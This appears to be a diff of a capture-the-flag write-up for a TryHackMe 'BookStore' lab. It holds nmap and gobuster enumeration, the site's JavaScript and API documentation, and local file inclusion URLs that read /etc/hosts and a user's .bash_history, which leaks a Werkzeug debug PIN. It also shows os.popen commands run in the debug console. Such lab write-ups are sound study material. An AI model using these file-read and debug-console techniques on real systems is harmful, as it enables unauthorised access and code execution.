@@ -1,5 +1,7 @@
 
 <code>
+
+### Service Enumaration  
 ┌──(duke㉿kali)-[~/Documents/THM_BookStore]
 └─$ nmap  -sV -Pn 10.10.189.121
 
@@ -15,6 +17,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
+
+### Web Enumaration  
 
 ┌──(duke㉿kali)-[~/Documents/THM_BookStore]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.189.121 -x .txt,.php,html
@@ -42,6 +46,51 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ` 2024/02/19 04:45:40 Finished
 ` ===============================================================
 
+
+
+
+function getAPIURL() {
+var str = window.location.hostname;
+str = str + ":5000"
+return str;
+
+    }
+
+
+async function getUsers() {
+    var u=getAPIURL();
+    let url = 'http://' + u + '/api/v2/resources/books/random4';
+    try {
+        let res = await fetch(url);
+	return await res.json();
+    } catch (error) {
+        console.log(error);
+    }
+}
+
+async function renderUsers() {
+    let users = await getUsers();
+    let html = '';
+    users.forEach(user => {
+        let htmlSegment = `<div class="user">
+	 	        <h2>Title : ${user.title}</h3> <br>
+                        <h3>First Sentence : </h3> <br>
+			<h4>${user.first_sentence}</h4><br>
+                        <h1>Author: ${user.author} </h1> <br> <br>        
+                </div>`;
+
+        html += htmlSegment;
+   });
+   
+    let container = document.getElementById("respons");
+    container.innerHTML = html;
+}
+renderUsers();
+//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
+
+
+
+
 API Documentation
 Since every good API has a documentation we have one as well!
 The various routes this API currently provides are:
@@ -57,5 +106,18 @@ The various routes this API currently provides are:
 /api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
 
 /api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
+
+
+
+>>> os.popen('id').read()
+'uid=1000(sid) gid=1000(sid) groups=1000(sid)\n'
+>>> os.popen('pwd').read()
+'/home/sid\n'
+
+
+http://10.10.194.43:5000/api/v1/resources/books?show=/etc/hosts
+http://10.10.194.43:5000/api/v1/resources/books?show=/home/sid/.bash_history
+cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit 
+
 
 <\code>
